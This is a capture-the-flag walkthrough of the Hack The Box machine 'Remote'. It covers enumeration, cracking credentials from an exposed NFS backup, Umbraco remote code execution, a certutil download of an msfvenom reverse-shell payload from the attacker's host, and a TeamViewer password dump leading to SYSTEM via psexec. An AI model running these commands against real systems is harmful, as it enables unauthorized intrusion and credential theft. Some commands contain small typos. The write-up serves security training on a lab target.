---
description: https://www.hackthebox.eu/home/machines/profile/234
---

# Remote

![](<../../../.gitbook/assets/image (356) (1).png>)

## Scanning and Enumeration

### Nmap

```
nmap 10.10.10.180  -p- -v -sS -T4 -sV

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

After this we can attempt to discover the OS version with the SMB discocvery script and the `-O` switch enabled. We have a best guest of Windows 10 1709.

```
nmap 10.10.10.180  -O -p 135,139,445 -sV --script=smb-os-discovery


PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Port 21 FTP

As port 21 is open we can check for anonymous login with the Nmap script `--script=ftp-anon.nse`

```
nmap 10.10.10.180 -p 21 --script=ftp-anon.nse

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

I logged in with the anonymous user and tried to look for files or any hidden files. With nothing at all found I tested for file upload and was given access denied.

![](<../../../.gitbook/assets/image (357) (1).png>)

### Port 80

We have a web server running on port 80. Navigating to the root page brings us to the following:

![](<../../../.gitbook/assets/image (358) (1).png>)

Before proceeding lets run a directory brute force on the webpage. I will be using [`feroxbuster`](https://github.com/epi052/feroxbuster) for this.

![](<../../../.gitbook/assets/image (359) (1).png>)

Scrolling down from the root page and we see some recent posts mentioning Umbraco.

![](<../../../.gitbook/assets/image (360) (1).png>)

The Wappalyzer extension for Firefox also confirms the website is running Umbraco.

![](<../../../.gitbook/assets/image (361).png>)

At this point I have manually looked through the website more and was unable to find anything else interesting. Going back to our nmap scan earlier we do have Port 2049 open.

### Port 2049 mountd

mountd is a mount deamon for the Network File System (NFS). We can use the `showmount -e` command to view shareable directories on a remote system.

```
showmount -e 10.10.10.180
```

![](<../../../.gitbook/assets/image (362) (1).png>)

In preparation for mounting the share create a directory in which we can mount the share inside of. I created the following share `/tmp/remotemount`.

Run the following command to mount the share.

```
mount-t 10.10.10.180:/site_backups /tmp/remotemount/
```

We can then use the `df -k` command to list mounted shares and confirm if working.

![](<../../../.gitbook/assets/image (363) (1).png>)

We can now move into the directory.

![](<../../../.gitbook/assets/image (364) (1).png>)

At this point I have spent some time going around the remote directory and could not find anything interesting. Since we are dealing with quite a large amount of folders we need to find a way to go through each file and identify potential interesting information.

As App\_Data usually contains interesting information I will begin by recursively running `cat` and `grep` to look for keywords contained in files.

```
ls -R *  | cat * | grep -r username
```

![](<../../../.gitbook/assets/image (365).png>)

The output is quite large so I have only taken a snippet but we have gained the following information from this:

| Usernames        | Passwords         |
| ---------------- | ----------------- |
| Admin@htb.local  | Umbracoadmin123!! |
| ssmith@htb.local |                   |

Before we attempt to look where to use these found credentials lets use them in our command above to see if these accounts are contained elsewhere.

```
ls -R *  | cat * | grep -r ssmith
```

![](<../../../.gitbook/assets/image (366).png>)

We have a similar results this time and we also have the line at the bottom stating that "Binary file Umbraco.sdf matches".

We can specify the strings command on this file since its is a binary file.

```
strings Umbraco.sdf | grep ssmith
```

![](<../../../.gitbook/assets/image (367).png>)

Lets check if we can find anything for the admin account in this file.

```
strings Umbraco.sdf | grep admin@htb.local
```

![](<../../../.gitbook/assets/image (368) (1).png>)

The output suggest SHA1 hash. We can double confirm this using hash-identifier.

![](<../../../.gitbook/assets/image (369) (1).png>)

I put the hash in a text file and run John the Ripper against it.

```
john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/hash
```

![](<../../../.gitbook/assets/image (370).png>)

We have obtained the credentials "admin@htb.local:baconandcheese"

Going back to feroxbuster we find that one of the directories that has been discovered is `/install.` When we head over to this URL we are presented with the following login page which accepts the credentials we have found.

![Logon screen at /install](<../../../.gitbook/assets/image (371) (1).png>)

![After logging in](<../../../.gitbook/assets/image (372).png>)

Clicking help in the bottom left allows us to view the current running version of Umbraco.

![](<../../../.gitbook/assets/image (373) (1).png>)

At this point I went to Google and searched for "Umbraco 7.12.4 Windows exploit" and come across this:

{% embed url="https://packetstormsecurity.com/files/158712/Umbraco-CMS-7.12.4-Remote-Code-Execution.html" %}

I downloaded the python script and done a test command to check if working.

```
python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c ipconfig
```

![](<../../../.gitbook/assets/image (374).png>)

Now that we have command execution we need to think about getting a proper reverse shell as this would be preferable to our current one. I created a payload with `msfvenom` as below:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4455 -f exe -o /home/kali/scripts/windows/revshell.exe
```

After this was created I hosted a python server in the directory where the payload is stored.

```
Python -m SimpleHttpServer 80
```

After this we can run the following command on the exploit to download the file and place it in a global writeable directory. The server the exploit command is run from is not writeable to the account we are running as.

```
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c cmd.exe -a '/c certutil.exe  -f -urlcache -split http://10.10.14.14/reverseshell.exe c:/users/public/reverseshell.exe'
```

After this has been completed we can confirm if the file has been downloaded by checking our python server logs.

![](<../../../.gitbook/assets/image (375) (1).png>)

After this we need to setup a `netcat` listener on our attacking machine.

```
nc -lvp 4455
```

Once this is setup we can run the exploit again this time calling the `msfvenom` payload we put in `C:\users\Public` earlier on.

```
sudo python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c cmd.exe -a '/c c:/users/public/reverseshell.exe '
```

Once this is run we should get a call back on our listener.

![](<../../../.gitbook/assets/image (376).png>)

As per standard practice I transferred over `winPEAS.exe` using `certuil.exe` and then run it. I found TeamViewer7 as being an installed application. Knowing that 7 is an old version of Teamviewer I went to Google to research exploits.

![](<../../../.gitbook/assets/image (377).png>)

After searching for exploits with the current version we come across this which has a CVE score of 7.0.

![](<../../../.gitbook/assets/image (378).png>)

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2019-18988" %}

We also find a brilliant blog post covering this exploit.

{% embed url="https://whynotsecurity.com/blog/teamviewer/" %}

If we search for the CVE number on Github we come across multiple PoC scripts. In this case I will be using the Powershell "WatchTV" by zaphoxx.

{% embed url="https://github.com/zaphoxx/WatchTV" %}

I downloaded the script onto the victim machine and loaded it into Powershell. I then run the command `Get-TeamViewPasswords`.

![](<../../../.gitbook/assets/image (379) (1).png>)

We retrieve the password: !R3m0te!

With this we are hoping for password reuse somewhere. We should now see where we can use this with known credentials.

For access I have gone over using Impacket's psexec.py before so this time I will instead use the metasploit module `exploit/windows/smb/psexec` . Load the module and set the required options.

![](<../../../.gitbook/assets/image (380).png>)

We now have access as system and can grab bother user and root flags.
